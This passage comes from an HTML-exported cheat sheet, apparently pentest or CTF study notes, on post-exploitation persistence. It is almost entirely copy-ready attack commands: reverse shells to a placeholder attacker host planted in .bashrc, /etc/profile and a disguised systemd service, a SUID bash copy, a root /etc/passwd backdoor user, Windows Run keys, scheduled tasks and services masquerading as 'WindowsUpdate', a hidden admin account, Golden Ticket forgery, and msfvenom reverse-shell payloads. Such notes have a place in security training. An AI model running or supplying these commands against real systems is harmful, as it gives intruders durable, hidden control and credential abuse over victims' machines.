+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4fd1ba038819493e882fac8a69819ed4>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_4fd1ba038819493e882fac8a69819ed4=document.querySelector('button[name=btn_4fd1ba038819493e882fac8a69819ed4]');
+copyBtnbtn_4fd1ba038819493e882fac8a69819ed4.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Copy bash and set SUID — accessible by any user\ncp /bin/bash /tmp/.bash\nchmod +s /tmp/.bash\n\n# Execute\n/tmp/.bash -p    # -p preserves EUID (root)\n`);copyBtnbtn_4fd1ba038819493e882fac8a69819ed4.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4fd1ba038819493e882fac8a69819ed4.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Copy bash and set SUID &#8212; accessible by any user
+</span>cp /bin/bash /tmp/.bash
+chmod +s /tmp/.bash
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Execute
+</span>/tmp/.bash -p    <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">-p preserves EUID (root)</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org6098cf3" class="outline-3">
+<h3 id="org6098cf3">Bash RC / Profile</h3>
+<div class="outline-text-3" id="text-org6098cf3">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_9cd9c0b482b349b193b504ea80264a5a>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_9cd9c0b482b349b193b504ea80264a5a=document.querySelector('button[name=btn_9cd9c0b482b349b193b504ea80264a5a]');
+copyBtnbtn_9cd9c0b482b349b193b504ea80264a5a.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Fires when target user opens a new shell\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> ~/.bashrc\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> ~/.bash_profile\necho 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1' >> /etc/profile  # all users, needs root\n`);copyBtnbtn_9cd9c0b482b349b193b504ea80264a5a.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_9cd9c0b482b349b193b504ea80264a5a.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Fires when target user opens a new shell
+</span><span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1'</span> &gt;&gt; ~/.bashrc
+<span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1'</span> &gt;&gt; ~/.bash_profile
+<span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1'</span> &gt;&gt; /etc/profile  <span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">all users, needs root</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org2482bbe" class="outline-3">
+<h3 id="org2482bbe">Systemd Service (requires root)</h3>
+<div class="outline-text-3" id="text-org2482bbe">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b5e05b72da1a4bc68aef8745ec27ab44>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_b5e05b72da1a4bc68aef8745ec27ab44=document.querySelector('button[name=btn_b5e05b72da1a4bc68aef8745ec27ab44]');
+copyBtnbtn_b5e05b72da1a4bc68aef8745ec27ab44.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`cat > /etc/systemd/system/backdoor.service << EOF\n[Unit]\nDescription=System Update Service\n\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'\nRestart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl enable backdoor.service\nsystemctl start backdoor.service\n`);copyBtnbtn_b5e05b72da1a4bc68aef8745ec27ab44.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b5e05b72da1a4bc68aef8745ec27ab44.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">cat &gt; /etc/systemd/system/backdoor.service &lt;&lt; EOF<span style="color: #2fafff;">
+[Unit]
+Description=System Update Service
+
+[Service]
+ExecStart=/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/$ATTACKER/4444 0&gt;&amp;1'
+Restart=always
+RestartSec=60
+
+[Install]
+WantedBy=multi-user.target
+EOF
+</span>
+systemctl enable backdoor.service
+systemctl start backdoor.service
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orged0a3b5" class="outline-3">
+<h3 id="orged0a3b5">/etc/passwd Backdoor</h3>
+<div class="outline-text-3" id="text-orged0a3b5">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f9bb8dbfdeb141e4a854ea54a4ffd8e2>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_f9bb8dbfdeb141e4a854ea54a4ffd8e2=document.querySelector('button[name=btn_f9bb8dbfdeb141e4a854ea54a4ffd8e2]');
+copyBtnbtn_f9bb8dbfdeb141e4a854ea54a4ffd8e2.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Add new root-equivalent user with known password\nopenssl passwd -1 -salt xyz backdoor123\n\necho 'backdoor:$1$xyz$<hash>:0:0:root:/root:/bin/bash' >> /etc/passwd\n\nsu backdoor\n`);copyBtnbtn_f9bb8dbfdeb141e4a854ea54a4ffd8e2.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f9bb8dbfdeb141e4a854ea54a4ffd8e2.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Add new root-equivalent user with known password
+</span>openssl passwd -1 -salt xyz backdoor123
+
+<span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">echo</span> <span style="color: var(--clr-string); background-color: var(--bg-string);">'backdoor:$1$xyz$&lt;hash&gt;:0:0:root:/root:/bin/bash'</span> &gt;&gt; /etc/passwd
+
+su backdoor
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-orgae00901" class="outline-2">
+<h2 id="orgae00901">2. Windows Persistence</h2>
+<div class="outline-text-2" id="text-orgae00901">
+</div>
+<div id="outline-container-org4b12339" class="outline-3">
+<h3 id="org4b12339">Registry Run Keys</h3>
+<div class="outline-text-3" id="text-org4b12339">
+<p>
+Execute payload on every user login:
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_b674504251a8432ba64a8de140abd38d>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_b674504251a8432ba64a8de140abd38d=document.querySelector('button[name=btn_b674504251a8432ba64a8de140abd38d]');
+copyBtnbtn_b674504251a8432ba64a8de140abd38d.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Current user\nreg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n  /v Backdoor /t REG_SZ \\\n  /d \"C:\\Windows\\Temp\\shell.exe\" /f\n\n# All users (requires admin)\nreg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run \\\n  /v Backdoor /t REG_SZ \\\n  /d \"C:\\Windows\\Temp\\shell.exe\" /f\n`);copyBtnbtn_b674504251a8432ba64a8de140abd38d.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_b674504251a8432ba64a8de140abd38d.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Current user
+</span>reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run <span style="color: #2fafff;">\</span>
+  /v Backdoor /t REG_SZ <span style="color: #2fafff;">\</span>
+  /d <span style="color: var(--clr-string); background-color: var(--bg-string);">"C:\Windows\Temp\shell.exe"</span> /f
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">All users (requires admin)
+</span>reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run <span style="color: #2fafff;">\</span>
+  /v Backdoor /t REG_SZ <span style="color: #2fafff;">\</span>
+  /d <span style="color: var(--clr-string); background-color: var(--bg-string);">"C:\Windows\Temp\shell.exe"</span> /f
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org746f1f3" class="outline-3">
+<h3 id="org746f1f3">Scheduled Task</h3>
+<div class="outline-text-3" id="text-org746f1f3">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_ffeef8818deb43dfb28430eb678331da>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_ffeef8818deb43dfb28430eb678331da=document.querySelector('button[name=btn_ffeef8818deb43dfb28430eb678331da]');
+copyBtnbtn_ffeef8818deb43dfb28430eb678331da.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Run at logon — current user\nschtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Windows\\Temp\\shell.exe\" \\\n  /sc onlogon /ru %USERNAME% /f\n\n# Run every minute — requires admin for SYSTEM\nschtasks /create /tn \"SystemHealth\" /tr \"C:\\Windows\\Temp\\shell.exe\" \\\n  /sc minute /mo 1 /ru SYSTEM /f\n\n# Verify\nschtasks /query /tn \"WindowsUpdate\"\n\n# Remove\nschtasks /delete /tn \"WindowsUpdate\" /f\n`);copyBtnbtn_ffeef8818deb43dfb28430eb678331da.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_ffeef8818deb43dfb28430eb678331da.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Run at logon &#8212; current user
+</span>schtasks /create /tn <span style="color: var(--clr-string); background-color: var(--bg-string);">"WindowsUpdate"</span> /tr <span style="color: var(--clr-string); background-color: var(--bg-string);">"C:\Windows\Temp\shell.exe"</span> <span style="color: #2fafff;">\</span>
+  /sc onlogon /ru %USERNAME% /f
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Run every minute &#8212; requires admin for SYSTEM
+</span>schtasks /create /tn <span style="color: var(--clr-string); background-color: var(--bg-string);">"SystemHealth"</span> /tr <span style="color: var(--clr-string); background-color: var(--bg-string);">"C:\Windows\Temp\shell.exe"</span> <span style="color: #2fafff;">\</span>
+  /sc minute /mo 1 /ru SYSTEM /f
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Verify
+</span>schtasks /query /tn <span style="color: var(--clr-string); background-color: var(--bg-string);">"WindowsUpdate"</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Remove
+</span>schtasks /delete /tn <span style="color: var(--clr-string); background-color: var(--bg-string);">"WindowsUpdate"</span> /f
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgc28ca4d" class="outline-3">
+<h3 id="orgc28ca4d">New Local Admin User</h3>
+<div class="outline-text-3" id="text-orgc28ca4d">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_4b40d6a2dd4a4b73a293caf5c60e32bf>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_4b40d6a2dd4a4b73a293caf5c60e32bf=document.querySelector('button[name=btn_4b40d6a2dd4a4b73a293caf5c60e32bf]');
+copyBtnbtn_4b40d6a2dd4a4b73a293caf5c60e32bf.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`net user backdoor Password123! /add\nnet localgroup administrators backdoor /add\n\n# Verify\nnet user backdoor\n`);copyBtnbtn_4b40d6a2dd4a4b73a293caf5c60e32bf.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_4b40d6a2dd4a4b73a293caf5c60e32bf.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell">net user backdoor Password123! /add
+net localgroup administrators backdoor /add
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Verify
+</span>net user backdoor
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org817ec0a" class="outline-3">
+<h3 id="org817ec0a">Windows Service</h3>
+<div class="outline-text-3" id="text-org817ec0a">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_c4fb218c2fe94dc38026773ca32f5862>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_c4fb218c2fe94dc38026773ca32f5862=document.querySelector('button[name=btn_c4fb218c2fe94dc38026773ca32f5862]');
+copyBtnbtn_c4fb218c2fe94dc38026773ca32f5862.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Create service running payload as SYSTEM\nsc create \"WindowsUpdate\" binpath= \"C:\\Windows\\Temp\\shell.exe\" \\\n  start= auto obj= \"LocalSystem\"\n\nsc start \"WindowsUpdate\"\n\n# Cleanup\nsc stop \"WindowsUpdate\"\nsc delete \"WindowsUpdate\"\n`);copyBtnbtn_c4fb218c2fe94dc38026773ca32f5862.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_c4fb218c2fe94dc38026773ca32f5862.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Create service running payload as SYSTEM
+</span>sc create <span style="color: var(--clr-string); background-color: var(--bg-string);">"WindowsUpdate"</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">binpath</span>= <span style="color: var(--clr-string); background-color: var(--bg-string);">"C:\Windows\Temp\shell.exe"</span> <span style="color: #2fafff;">\</span>
+  <span style="color: var(--clr-variable); background-color: var(--bg-variable);">start</span>= auto <span style="color: var(--clr-variable); background-color: var(--bg-variable);">obj</span>= <span style="color: var(--clr-string); background-color: var(--bg-string);">"LocalSystem"</span>
+
+sc start <span style="color: var(--clr-string); background-color: var(--bg-string);">"WindowsUpdate"</span>
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Cleanup
+</span>sc stop <span style="color: var(--clr-string); background-color: var(--bg-string);">"WindowsUpdate"</span>
+sc delete <span style="color: var(--clr-string); background-color: var(--bg-string);">"WindowsUpdate"</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgc3552a5" class="outline-3">
+<h3 id="orgc3552a5">Startup Folder</h3>
+<div class="outline-text-3" id="text-orgc3552a5">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_3431d939f93a431c9a2882df0b79c21f>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_3431d939f93a431c9a2882df0b79c21f=document.querySelector('button[name=btn_3431d939f93a431c9a2882df0b79c21f]');
+copyBtnbtn_3431d939f93a431c9a2882df0b79c21f.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Current user\ncopy shell.exe \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n\n# All users (requires admin)\ncopy shell.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"\n`);copyBtnbtn_3431d939f93a431c9a2882df0b79c21f.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_3431d939f93a431c9a2882df0b79c21f.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Current user
+</span>copy shell.exe <span style="color: var(--clr-string); background-color: var(--bg-string);">"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
+
+# All users (requires admin)
+copy shell.exe "</span>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup<span style="color: var(--clr-string); background-color: var(--bg-string);">\"</span>
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-org6f729a4" class="outline-3">
+<h3 id="org6f729a4">Golden Ticket (AD — post DCSync)</h3>
+<div class="outline-text-3" id="text-org6f729a4">
+<p>
+After obtaining the KRBTGT hash via DCSync or NTDS dump, forge
+Kerberos tickets that grant persistent DA access — survives
+password resets unless KRBTGT is rotated twice.
+</p>
+
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_835c9ba50c1143b7bd59a34294107e53>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_835c9ba50c1143b7bd59a34294107e53=document.querySelector('button[name=btn_835c9ba50c1143b7bd59a34294107e53]');
+copyBtnbtn_835c9ba50c1143b7bd59a34294107e53.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Mimikatz\nkerberos::golden /user:Administrator /domain:domain.local \\\n  /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500\n\n# Use ticket\nkerberos::ptt ticket.kirbi\n\n# Or Impacket from Linux\nimpacket-ticketer -nthash KRBTGT_HASH \\\n  -domain-sid S-1-5-21-... \\\n  -domain domain.local Administrator\nexport KRB5CCNAME=Administrator.ccache\nimpacket-psexec -k -no-pass domain.local/Administrator@$DC\n`);copyBtnbtn_835c9ba50c1143b7bd59a34294107e53.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_835c9ba50c1143b7bd59a34294107e53.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Mimikatz
+</span>kerberos::golden /user:Administrator /domain:domain.local <span style="color: #2fafff;">\</span>
+  /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /id:500
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Use ticket
+</span>kerberos::ptt ticket.kirbi
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Or Impacket from Linux
+</span>impacket-ticketer -nthash KRBTGT_HASH <span style="color: #2fafff;">\</span>
+  -domain-sid S-1-5-21-... <span style="color: #2fafff;">\</span>
+  -domain domain.local Administrator
+<span style="color: var(--clr-builtin); background-color: var(--bg-builtin);">export</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">KRB5CCNAME</span>=Administrator.ccache
+impacket-psexec -k -no-pass domain.local/Administrator@$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">DC</span>
+</pre>
+</div></div>
+</div>
+</div>
+</div>
+<div id="outline-container-org1d2e09e" class="outline-2">
+<h2 id="org1d2e09e">3. Payload Generation</h2>
+<div class="outline-text-2" id="text-org1d2e09e">
+<div class='org-src-wrapper'>
+<div class='org-src-bar'><span class='srcLangLabel'>SHELL</span><button class='copyBtn' name=btn_f8f84df31fc94279bb398ef03bcdfbf9>&#10697;</button>
+<script type='text/javascript'>
+var copyBtnbtn_f8f84df31fc94279bb398ef03bcdfbf9=document.querySelector('button[name=btn_f8f84df31fc94279bb398ef03bcdfbf9]');
+copyBtnbtn_f8f84df31fc94279bb398ef03bcdfbf9.addEventListener('click', function(event) {
+let res = copyTextToClipboard(`# Windows reverse shell EXE\nmsfvenom -p windows/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o shell.exe\n\n# With staged Meterpreter for more features\nmsfvenom -p windows/x64/meterpreter/reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f exe -o meter.exe\n\n# Linux ELF\nmsfvenom -p linux/x64/shell_reverse_tcp \\\n  LHOST=$ATTACKER LPORT=4444 -f elf -o shell.elf\nchmod +x shell.elf\n`);copyBtnbtn_f8f84df31fc94279bb398ef03bcdfbf9.innerHTML = res ? '&#10003;' : 'error';setTimeout(() => { copyBtnbtn_f8f84df31fc94279bb398ef03bcdfbf9.innerHTML = '&#10697;'}, 3000);
+});
+</script>
+</div><div class="org-src-container">
+<pre class="src src-shell"><span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Windows reverse shell EXE
+</span>msfvenom -p windows/x64/shell_reverse_tcp <span style="color: #2fafff;">\</span>
+  <span style="color: var(--clr-variable); background-color: var(--bg-variable);">LHOST</span>=$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">ATTACKER</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">LPORT</span>=4444 -f exe -o shell.exe
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">With staged Meterpreter for more features
+</span>msfvenom -p windows/x64/meterpreter/reverse_tcp <span style="color: #2fafff;">\</span>
+  <span style="color: var(--clr-variable); background-color: var(--bg-variable);">LHOST</span>=$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">ATTACKER</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">LPORT</span>=4444 -f exe -o meter.exe
+
+<span style="color: var(--clr-comment-delimiter); background-color: var(--bg-comment-delimiter);"># </span><span style="color: var(--clr-comment); background-color: var(--bg-comment);">Linux ELF
+</span>msfvenom -p linux/x64/shell_reverse_tcp <span style="color: #2fafff;">\</span>
+  <span style="color: var(--clr-variable); background-color: var(--bg-variable);">LHOST</span>=$<span style="color: var(--clr-variable); background-color: var(--bg-variable);">ATTACKER</span> <span style="color: var(--clr-variable); background-color: var(--bg-variable);">LPORT</span>=4444 -f elf -o shell.elf
+chmod +x shell.elf
+</pre>
+</div></div>
+</div>
+</div>
+<div id="outline-container-orgd81e2ea" class="outline-2">
+<h2 id="orgd81e2ea">Tips</h2>
+<div class="outline-text-2" id="text-orgd81e2ea">
+<ul class="org-ul">
+<li>SSH authorised keys is the cleanest Linux persistence — no
+process running, no cron noise, looks legitimate</li>
+<li>On CTFs, persistence is rarely needed — the flag is usually
+obtainable in one session; understand the techniques for the
+exam but don't spend time implementing them unless asked</li>
+<li>Registry Run keys are the most common Windows persistence
+mechanism and the first thing defenders check — use scheduled
+tasks or services for slightly more durable access</li>
+<li>Golden Tickets are extremely powerful but require KRBTGT hash —
+only relevant after full AD compromise</li>
+<li>Always clean up persistence mechanisms after a real engagement
+— leaving backdoors is a critical reporting issue</li>
+</ul>
+</div>
+</div>
+</div>
+<div id="postamble" class="status">
+<script type="text/javascript">
+<!--/*--><![CDATA[/*><!--*/
+if (!document.cookie.split('; ').find(r => r.startsWith('mode'))) {
+document.cookie = 'mode=dark'
+}
+document.cookie = 'light=modus-operandi-tinted'
+document.cookie = 'dark=modus-vivendi-tinted'
+/*
+;; nice-org-html.js
+;;==============================================================================
+;; Copyright (C) 2024, Ewan Townshend
+
+;; Author: Ewan Townshend
+;; URL: https://github.com/ewantown/nice-org-html
+;; Version: 1.2
+
+;;==============================================================================
+;; This program is free software; you can redistribute it and/or modify
+;; it under the terms of the GNU General Public License as published by
+;; the Free Software Foundation, either version 3 of the License, or
+;; (at your option) any later version.
+
+;; This program is distributed in the hope that it will be useful,
+;; but WITHOUT ANY WARRANTY; without even the implied warranty of
+;; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+;; GNU General Public License for more details.
+
+;; You should have received a copy of the GNU General Public License
+;; along with this program.  If not, see <https://www.gnu.org/licenses/>.
+
+;; This file is not part of emacs.
+
+;;==============================================================================
+;; JS for html exported by et-org-html.el
+ */
+
+const preamble = document.getElementById("preamble");
+const content = document.getElementById("content");
+const postamble = document.getElementById("postamble");
+
+const controls = document.getElementById("view-controls");
+const toggleTocBtn = document.getElementById("toggle-toc");
+const gotoTopBtn = document.getElementById("goto-top");
+const toggleModeBtn = document.getElementById("toggle-mode");
+const toc = document.getElementById("table-of-contents");
+
+// Get and parse options passed in cookie string
+const optCookie = document.cookie.split('; ').find(r => r.startsWith('options'));
+const options = {};
+if (optCookie) {
+  optCookie.split('=')[1].split('__').forEach(pair => {
+    const [key, val] = pair.split(':');
+    if (key && val) {
+      options[key] = val;
+    }
+  })
+}
+
+// Move sticky control bar (injected within preamble)
+document.body.insertBefore(controls, content);
+
+// Mode handling
+function getMode() {
+  let cookie = document.cookie.split('; ').find(r => r.startsWith('mode'))
+  return cookie && cookie.split("=")[1];
+}
+
+function setMode(mode) {
+  document.body.dataset.mode = mode;
+  let thmCookie = document.cookie.split('; ').find(r => r.startsWith(mode));
+  document.body.dataset.theme = thmCookie ? thmCookie.split('=')[1] : 'unknown';
+  toggleModeBtn.innerHTML = (mode === 'light') ? '&#9789;' : '&#9788;';
+  document.cookie = 'mode=' + mode;
+}
+
+// Initially, set mode based on stored cookie
+let mode = getMode();
+if (mode && ["light", "dark"].includes(mode)) {
+  setMode(mode);
+} else {  
+  let prop = "prefers-color-scheme";
+  let pref = (mode === "query") && window.matchMedia &&
+    ["light", "dark"].find(s => window.matchMedia(`(${prop}: ${s})`).matches);
+  setMode(pref || "dark"); // fallback: dark
+}
+
+// Mode toggling
+toggleModeBtn.addEventListener('click', () => {
+  setMode(document.body.dataset.mode === 'dark' ? 'light' : 'dark');
+})
+
+
+// Jump to top
+let scrollY = document.documentElement.scrollTop;
+window.addEventListener('scroll', () => {
+  let atTop = document.documentElement.scrollTop <= preamble.offsetHeight;
+  gotoTopBtn.dataset.show = !atTop + "";
+});
+gotoTopBtn.addEventListener('click', () => {
+  window.scrollTo({
+    top: 0,
+    behavior: "smooth"
+  });
+})
+
+// Table-of-contents toggling
+if (toc) {
+  toggleTocBtn.dataset.show = 'true';
+  toggleTocBtn.addEventListener('click', () => {
+    let showingToc = document.body.dataset.toc;
+    scrollY = showingToc ? scrollY : document.documentElement.scrollTop;
+    if (showingToc) {
+      document.body.dataset.toc = '';
+      document.documentElement.scrollTop = scrollY;
+    } else {
+      let tocHeight =
+	Math.max(
+	  window.innerHeight - controls.offsetHeight,
+	  toc.offsetHeight
+	);
+      const header = document.getElementById("injected-header");
+      if (header && (scrollY > header.offsetHeight)) {
+	document.documentElement.scrollTop = preamble.offsetHeight;
+      }
+      toc.style.height = `${tocHeight}px`;
+      document.body.dataset.toc = 'true';
+    }
+    toc.addEventListener('click', () => {
+      if (document.body.dataset.toc) {
+	document.body.dataset.toc = '';
+	document.documentElement.scrollTop = scrollY;
+      }
+    })
+  })
+};
+
+// Instrument anchor linking for sticky control bar
+document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+  anchor.addEventListener('click', (e) => {
+    e.preventDefault();
+    const targetId = e.currentTarget.getAttribute('href');
+    const target = document.querySelector(targetId);
+
+    setTimeout(() => {
+      const targetPos = target.getBoundingClientRect().top;
+      let offset = targetPos + document.documentElement.scrollTop;
+      offset -= controls.offsetHeight;
+      window.scrollTo({
+	top: offset,
+	behavior: "smooth"
+      });
+    }, 0);
+  });
+});
+
+function copyTextToClipboard(text) {
+  // Make invisible textarea
+  var textArea = document.createElement("textarea");
+  textArea.style.position = 'fixed';
+  textArea.style.top = 0;
+  textArea.style.left = 0;
+  textArea.style.width = '2em';
+  textArea.style.height = '2em';
+  textArea.style.padding = 0;
+  textArea.style.border = 'none';
+  textArea.style.outline = 'none';
+  textArea.style.boxShadow = 'none';
+  textArea.style.background = 'transparent';
+
+  // Copy contents into it
+  textArea.value = text;
+
+  // Try to copy from it to clipboard
+  document.body.appendChild(textArea);
+  textArea.focus();
+  textArea.select();
+  var res;
+  try {
+    res = document.execCommand('copy');
+  } catch (err) {
+    res = false;
+  }
+
